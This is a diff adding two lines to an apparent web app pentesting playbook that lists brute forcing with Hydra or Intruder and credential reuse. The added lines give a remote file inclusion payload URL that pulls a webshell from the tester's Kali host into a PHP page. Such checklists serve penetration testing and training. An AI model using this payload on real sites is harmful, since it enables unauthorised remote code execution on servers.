@@ -15,3 +15,5 @@ Web App Playbook
 *   See what how authentication requests work
 *   Hydra/intruder
 * Try creds found in other enumeration (services on other ports, etc., if available)
+* Does the page use php?  Try basic RFI: `http://example.com/index.php?page=http://<kali ip>/<webshell.php>`
+   * (use index.php, or if you find a different php file, use that)
